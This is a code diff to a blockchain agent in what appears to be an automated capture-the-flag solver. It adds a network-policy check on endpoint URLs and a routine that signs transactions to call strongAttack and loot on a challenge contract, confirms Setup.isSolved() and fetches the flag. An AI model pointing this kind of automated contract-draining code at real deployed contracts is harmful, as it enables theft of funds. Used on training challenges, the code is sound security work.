@@ -16,7 +16,7 @@ from agents.registry import AgentRegistry
 from tools.common.python_tool import PythonTool
 from core.decision_engine.llm_reasoner import LLMReasoner
 from core.utils.flag_utils import find_first_flag
-from core.utils.security import assert_url_allowed
+from core.utils.security import SecurityPolicyError, assert_url_allowed
 
 logger = logging.getLogger(__name__)
 
@@ -162,6 +162,20 @@ class BlockchainAgent(BaseAgent):
                 "steps": steps,
             }
 
+        try:
+            assert_url_allowed(rpc_url)
+            if flag_url:
+                assert_url_allowed(flag_url)
+        except SecurityPolicyError as exc:
+            steps.append(f"Blockchain endpoint blocked by network policy: {exc}")
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "failed",
+                "flag": None,
+                "steps": steps,
+            }
+
         steps.append(f"RPC URL: {rpc_url}")
         steps.append(f"Attacker address: {attacker_address}")
         steps.append(f"Target contract address: {target_address}")
@@ -182,6 +196,41 @@ class BlockchainAgent(BaseAgent):
             steps.append("Warning: No local Solidity files found in the challenge.")
         else:
             steps.append(f"Loaded {len(solidity_sources)} Solidity file(s) for analysis.")
+
+        # Prefer bounded, deterministic Web3 interaction when the deployed
+        # contract itself proves it exposes the creature lifecycle interface.
+        direct_flag = self._try_creature_lifecycle(
+            rpc_url=rpc_url,
+            private_key=private_key,
+            attacker_address=attacker_address,
+            target_address=target_address,
+            setup_address=setup_address,
+            flag_url=flag_url,
+            steps=steps,
+            evidence_text=" ".join([
+                str(challenge.get("description", "")),
+                json.dumps(challenge.get("solve_trace_hints") or []),
+            ]),
+        )
+        if direct_flag:
+            return {
+                "challenge_id": challenge.get("id"),
+                "agent_id": self.agent_id,
+                "status": "solved",
+                "flag": direct_flag,
+                "steps": steps,
+                "artifacts": {
+                    "contract_lifecycle": {
+                        "techniques": [
+                            "evm_interface_probe",
+                            "creature_lifecycle_attack",
+                            "signed_web3_transactions",
+                        ],
+                        "transactions_bounded": 2,
+                        "captured_sensitive_values": False,
+                    }
+                },
+            }
 
         # 3. Generate script via LLM or fallback
         script_content = ""
@@ -285,6 +334,138 @@ class BlockchainAgent(BaseAgent):
 
     def get_capabilities(self) -> List[str]:
         return self.capabilities
+
+    def _try_creature_lifecycle(
+        self,
+        *,
+        rpc_url: str,
+        private_key: Optional[str],
+        attacker_address: Optional[str],
+        target_address: Optional[str],
+        setup_address: Optional[str],
+        flag_url: Optional[str],
+        steps: List[str],
+        evidence_text: str,
+    ) -> Optional[str]:
+        """Probe and execute a bounded lifePoints/strongAttack/loot workflow."""
+        if not all((private_key, attacker_address, target_address, flag_url)):
+            return None
+        lowered_evidence = evidence_text.lower()
+        if not any(
+            marker in lowered_evidence
+            for marker in (
+                "monster", "warrior", "creature", "life point",
+                "creature_lifecycle_attack",
+            )
+        ):
+            return None
+        assert_url_allowed(rpc_url)
+        assert_url_allowed(flag_url)
+        try:
+            import requests
+            from web3 import Web3
+
+            web3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={"timeout": 8}))
+            if not web3.is_connected():
+                return None
+            attacker = Web3.to_checksum_address(attacker_address)
+            target = Web3.to_checksum_address(target_address)
+            creature = web3.eth.contract(address=target, abi=[
+                {
+                    "inputs": [],
+                    "name": "lifePoints",
+                    "outputs": [{"type": "uint256"}],
+                    "stateMutability": "view",
+                    "type": "function",
+                },
+                {
+                    "inputs": [{"type": "uint256", "name": "_damage"}],
+                    "name": "strongAttack",
+                    "outputs": [],
+                    "stateMutability": "nonpayable",
+                    "type": "function",
+                },
+                {
+                    "inputs": [],
+                    "name": "loot",
+                    "outputs": [],
+                    "stateMutability": "nonpayable",
+                    "type": "function",
+                },
+            ])
+            life_points = int(creature.functions.lifePoints().call())
+            if life_points < 0 or life_points > 10**18:
+                return None
+            steps.append(
+                "Contract interface probe confirmed lifePoints(); testing the evidence-matched "
+                "strongAttack(uint256)/loot() lifecycle."
+            )
+
+            transactions = 0
+            if life_points > 0:
+                self._send_bounded_transaction(
+                    web3,
+                    creature.functions.strongAttack(life_points),
+                    attacker,
+                    private_key,
+                )
+                transactions += 1
+                steps.append("Submitted a bounded strongAttack transaction for the observed life points.")
+
+            remaining = int(creature.functions.lifePoints().call())
+            if remaining != 0:
+                steps.append(f"Creature remains alive with {remaining} life points; stopping direct path.")
+                return None
+
+            if int(web3.eth.get_balance(target)) > 0 and transactions < 2:
+                self._send_bounded_transaction(
+                    web3,
+                    creature.functions.loot(),
+                    attacker,
+                    private_key,
+                )
+                transactions += 1
+                steps.append("Submitted the bounded loot transaction after lifePoints reached zero.")
+
+            if setup_address:
+                setup = web3.eth.contract(
+                    address=Web3.to_checksum_address(setup_address),
+                    abi=[{
+                        "inputs": [],
+                        "name": "isSolved",
+                        "outputs": [{"type": "bool"}],
+                        "stateMutability": "view",
+                        "type": "function",
+                    }],
+                )
+                if not bool(setup.functions.isSolved().call()):
+                    steps.append("Setup.isSolved() remained false after the bounded lifecycle path.")
+                    return None
+                steps.append("Verified Setup.isSolved() returned true.")
+
+            response = requests.get(flag_url, timeout=8)
+            flag = find_first_flag(response.text if response.status_code == 200 else "")
+            if flag:
+                steps.append("Retrieved an evidence-bound flag after on-chain solve verification.")
+                return flag
+        except Exception as exc:
+            steps.append(f"Deterministic contract lifecycle path did not apply: {exc}")
+        return None
+
+    @staticmethod
+    def _send_bounded_transaction(web3: Any, function: Any, sender: str, private_key: str) -> None:
+        transaction = function.build_transaction({
+            "from": sender,
+            "nonce": web3.eth.get_transaction_count(sender),
+            "gas": 150_000,
+            "gasPrice": web3.eth.gas_price,
+            "chainId": web3.eth.chain_id,
+        })
+        signed = web3.eth.account.sign_transaction(transaction, private_key)
+        tx_hash = web3.eth.send_raw_transaction(signed.raw_transaction)
+        receipt = web3.eth.wait_for_transaction_receipt(tx_hash, timeout=20)
+        if int(receipt.status) != 1:
+            raise RuntimeError("transaction reverted")
 
     def _find_host_port(self, challenge: Dict[str, Any]) -> Optional[Tuple[str, int]]:
         candidates = []
